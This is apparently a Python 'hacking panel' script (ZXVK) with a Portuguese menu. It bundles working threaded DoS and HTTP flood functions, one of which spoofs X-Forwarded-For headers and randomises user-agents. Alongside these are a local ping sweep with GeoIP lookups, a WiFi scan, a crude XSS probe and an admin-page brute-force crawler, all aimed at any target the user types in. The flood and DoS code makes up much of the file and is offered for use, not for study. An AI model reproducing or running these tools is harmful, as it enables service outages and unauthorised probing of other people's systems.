import os
import sys
import socket
import threading
import time
import random
import string
import secrets
import requests  
import subprocess  
import re
from colorama import init, Fore, Style

init(autoreset=True)

# Database
DB_FILENAME = 'database.txt'
DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), DB_FILENAME)
if not os.path.exists(DB_PATH):
    open(DB_PATH, 'w', encoding='utf-8').close()

def load_data():
    try:
        with open(DB_PATH, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_data(data):
    with open(DB_PATH, 'w', encoding='utf-8') as f:
        for item in data:
            f.write(item + '\n')

# UI

def show_banner():
    art = (
        "███████╗██╗  ██╗██╗   ██╗██╗  ██╗\n"
        "╚══███╔╝╚██╗██╔╝██║   ██║██║ ██╔╝\n"
        "  ███╔╝  ╚███╔╝ ██║   ██║█████╔╝ \n"
        " ██╔╝    ██╔██╗ ╚██╗ ██╔╝██╔═██╗ \n"
        "███████╗██╔╝ ██╗ ╚████╔╝ ██║  ██╗\n"
        "╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝"
    )
    print(Fore.RED + art)
    print(Fore.YELLOW + "By encrypted64_ - discord.gg/TWHMMJpRMb")


def loading():
    for i in range(3):
        print(Fore.CYAN + 'Carregando' + '.' * (i+1), end='\r')
        time.sleep(0.7)
    print(' ' * 30, end='\r')

# 1: Gerenciar Database
def manage_database():
    data = load_data()
    while True:
        print(Fore.BLUE + "--- Gerenciar Database ---")
        print(Fore.YELLOW + "1." + Style.RESET_ALL + " Adicionar dado")
        print(Fore.YELLOW + "2." + Style.RESET_ALL + " Mostrar dados")
        print(Fore.YELLOW + "3." + Style.RESET_ALL + " Gerar keys criptografadas")
        print(Fore.YELLOW + "4." + Style.RESET_ALL + " Voltar")
        choice = input(Fore.BLUE + "Opção: ").strip()
        if choice == '1':
            print(Fore.YELLOW + "Digite os dados (digite FIM para terminar):")
            while True:
                entry = input('> ').strip()
                if entry.upper() == 'FIM':
                    break
                data.append(entry)
            save_data(data)
            print(Fore.GREEN + "Dados adicionados!")
        elif choice == '2':
            data = load_data()
            if data:
                print(Fore.CYAN + "Itens no database:")
                for item in data:
                    print('- ' + item)
            else:
                print(Fore.RED + "Database vazio.")
        elif choice == '3':
            count = int(input(Fore.YELLOW + "Quantas keys gerar?: "))
            for _ in range(count):
                data.append(secrets.token_hex(16))
            save_data(data)
            print(Fore.GREEN + "Keys geradas e salvas!")
        elif choice == '4':
            return
        else:
            print(Fore.RED + "Opção inválida!")

# 2: Filtrar IPs de Site
def filter_ips():
    domain = input(Fore.YELLOW + "Domínio (ex: google.com): ").strip()
    try:
        infos = socket.getaddrinfo(domain, None)
        ips = sorted({info[4][0] for info in infos})
        if ips:
            print(Fore.GREEN + "IPs encontrados:")
            for ip in ips:
                print('- ' + ip)
            data = load_data()
            new = [ip for ip in ips if ip not in data]
            if new:
                data.extend(new)
                save_data(data)
                print(Fore.GREEN + f"{len(new)} IP(s) salvos.")
        else:
            print(Fore.RED + "Nenhum IP retornado.")
    except Exception as e:
        print(Fore.RED + f"Erro: {e}")

# 3: IP Tracker
def ip_tracker():
    data = load_data()
    if data:
        print(Fore.BLUE + "IPs no Database:")
        for ip in data:
            print('- ' + ip)
    else:
        print(Fore.RED + "Database vazio.")

# 4: DoS Test Local
def dos_test():
    target = input(Fore.YELLOW + "Alvo (IP ou domínio): ").strip()
    port = int(input(Fore.YELLOW + "Porta: "))
    threads = int(input(Fore.YELLOW + "Threads: "))
    print(Fore.CYAN + "Iniciando DoS local... (CTRL+C para parar)")
    def attack():
        while True:
            try:
                s = socket.socket()
                s.connect((target, port))
                s.send(b"GET / HTTP/1.1\r\nHost: \r\n\r\n")
                s.close()
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "DoS interrompido.")

# 5: Flood Site (El Diablo)
def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def flood_site():
    url = input(Fore.YELLOW + "URL alvo (http/https): ").strip()
    threads = int(input(Fore.YELLOW + "Threads simultâneas: "))
    print(Fore.CYAN + "Iniciando flood... (CTRL+C para parar)")
    def attack_loop():
        while True:
            try:
                headers = {
                    'User-Agent': f'Mozilla/5.0 ({random_string(6)})',
                    'X-Forwarded-For': '.'.join(str(random.randint(0, 255)) for _ in range(4))
                }
                requests.get(url, headers=headers, timeout=3)
                print(Fore.GREEN + ".", end='')
            except:
                print(Fore.RED + "x", end='')
    for _ in range(threads):
        threading.Thread(target=attack_loop, daemon=True).start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "Flood encerrado.")

# 6: WiFi Pentest & Scan
def wifi_scan():
    iface = input(Fore.YELLOW + "Interface WiFi (ex: wlan0): ").strip()
    print(Fore.CYAN + "Escaneando redes... (root necessário)")
    try:
        output = subprocess.check_output(['sudo', 'iwlist', iface, 'scan'], stderr=subprocess.DEVNULL).decode()
        ssids = set(re.findall(r'ESSID:"([^"]+)"', output))
        print(Fore.GREEN + f"Redes encontradas ({len(ssids)}):")
        for ssid in ssids:
            print('- ' + ssid)
    except Exception as e:
        print(Fore.RED + f"Erro: {e}")

# 7: Network Scan com GeoIP e detalhes
def network_scan():
    raw = input(Fore.YELLOW + "Prefixo de rede (ex: 192.168.1 ou 10.0.0): ").strip()
    parts = raw.split('.')
    if len(parts) not in (3, 4):
        print(Fore.RED + "Prefixo inválido. Use X.Y.Z ou X.Y.Z.W")
        return
    prefix = '.'.join(parts[:3]) + '.'
    print(Fore.CYAN + f"Escaneando hosts em {prefix}1-254...")
    alive = []
    def ping_host(ip):
        cmd = ['ping', '-n' if os.name=='nt' else '-c', '1', ip]
        if subprocess.call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
            alive.append(ip)
            print(Fore.GREEN + ip)
    threads = []
    for i in range(1, 255):
        ip = prefix + str(i)
        t = threading.Thread(target=ping_host, args=(ip,), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    print(Fore.BLUE + f"Scan concluído: {len(alive)} hosts ativos.")
    if not alive:
        print(Fore.YELLOW + "Nenhum host encontrado.")
        return
    data = load_data()
    for ip in alive:
        first = int(ip.split('.')[0])
        if first in (10, 172, 192):
            entry = f"{ip} | Private IP"
        else:
            try:
                geo = requests.get(f'http://ip-api.com/json/{ip}', timeout=3).json()
                entry = f"{ip} | ISP: {geo.get('isp','N/A')} | Cidade: {geo.get('city','N/A')}"
            except:
                entry = f"{ip} | ISP/Cidade: N/A"
        print(Fore.YELLOW + entry)
        if entry not in data:
            data.append(entry)
    save_data(data)
    print(Fore.GREEN + f"{len(alive)} entries salvos.")

# 8: Vulnerability Scanner
def vuln_scan():
    url = input(Fore.YELLOW + "URL alvo (http/https): ").strip()
    print(Fore.CYAN + "Iniciando verificação de vulnerabilidades...")
    try:
        r = requests.get(url, timeout=5)
        headers = r.headers
        missing = []
        for h in ['X-Frame-Options', 'Content-Security-Policy', 'X-XSS-Protection', 'Strict-Transport-Security']:
            if h not in headers:
                missing.append(h)
        if missing:
            print(Fore.RED + "Faltam headers de segurança: " + ", ".join(missing))
        else:
            print(Fore.GREEN + "Headers de segurança presentes.")
        test_param = '<script>alert(1)</script>'
        test_url = url + ('?q=' + test_param if '?' not in url else '&q=' + test_param)
        resp = requests.get(test_url, timeout=5)
        if test_param in resp.text:
            print(Fore.RED + "Possível XSS detectado!")
        else:
            print(Fore.GREEN + "Teste XSS básico não detectou vulnerabilidades.")
    except Exception as e:
        print(Fore.RED + f"Erro: {e}")

# 9: Encontrar página admin de um site (brute-force + crawling)
def find_admin_page():
    domain = input(Fore.YELLOW + "Digite a URL base (ex: https://exemplo.com): ").strip().rstrip('/')
    print(Fore.CYAN + f"Iniciando busca avançada de páginas admin em {domain}...")
    # Carrega robots.txt para caminhos proibidos
    paths = set()
    try:
        robots = requests.get(domain + '/robots.txt', timeout=5).text
        for line in robots.splitlines():
            if line.lower().startswith('disallow:'):
                p = line.split(':', 1)[1].strip()
                if p:
                    paths.add(p)
    except:
        pass
    # Lista comum de diretórios
    common_paths = [
        '/admin', '/administrator', '/login', '/admin/login', '/user/login',
        '/controlpanel', '/cpanel', '/adm', '/admin.php', '/admin.html'
    ]
    # Adiciona da common e do robots
    to_check = set(common_paths) | paths
    found = []
    lock = threading.Lock()

    def check_path(path):
        url = domain + path
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200:
                with lock:
                    print(Fore.GREEN + f"[200] {url}")
                    found.append(url)
            else:
                print(Fore.YELLOW + f"[{resp.status_code}] {url}")
            # Parse links para discovery
            if 'text/html' in resp.headers.get('Content-Type',''):
                for match in re.findall(r'href=["\']?([^"\'>]+)["\']?', resp.text, re.IGNORECASE):
                    if match.startswith('/') and match not in to_check:
                        to_check.add(match)
        except Exception as e:
            print(Fore.RED + f"Erro {url}: {e}")

    # Threaded scan
    threads = []
    for path in list(to_check):
        t = threading.Thread(target=check_path, args=(path,), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.1)
    for t in threads:
        t.join()

    if not found:
        print(Fore.RED + "Nenhuma página admin encontrada.")
    else:
        print(Fore.CYAN + f"Total encontradas: {len(found)}")
    input(Fore.BLUE + "Pressione Enter para voltar ao menu...")

# Menu Principal
if __name__ == '__main__':
    loading()
    show_banner()
    while True:
        print(Fore.BLUE + "=== Painel Principal ===")
        print(Fore.YELLOW + "1." + Style.RESET_ALL + " Gerenciar database")
        print(Fore.YELLOW + "2." + Style.RESET_ALL + " Filtrar IPs de Site")
        print(Fore.YELLOW + "3." + Style.RESET_ALL + " IP Tracker")
        print(Fore.YELLOW + "4." + Style.RESET_ALL + " Ataque DoS (Threads)")
        print(Fore.YELLOW + "5." + Style.RESET_ALL + " Flood Site (El Diablo)")
        print(Fore.YELLOW + "6." + Style.RESET_ALL + " WiFi Pentest & Scan")
        print(Fore.YELLOW + "7." + Style.RESET_ALL + " Scan de Rede Local")
        print(Fore.YELLOW + "8." + Style.RESET_ALL + " Vulnerability Scanner")
        print(Fore.YELLOW + "9." + Style.RESET_ALL + " Encontrar página admin")
        print(Fore.YELLOW + "10." + Style.RESET_ALL + " Sair")
        choice = input(Fore.BLUE + "Opção: ").strip()
        if choice == '1': manage_database()
        elif choice == '2': filter_ips()
        elif choice == '3': ip_tracker()
        elif choice == '4': dos_test()
        elif choice == '5': flood_site()
        elif choice == '6': wifi_scan()
        elif choice == '7': network_scan()
        elif choice == '8': vuln_scan()
        elif choice == '9': find_admin_page()
        elif choice == '10':
            print(Fore.GREEN + "Saindo...")
            break
        else:
            print(Fore.RED + "Opção inválida!")
        time.sleep(1)
        os.system('cls' if os.name=='nt' else 'clear')
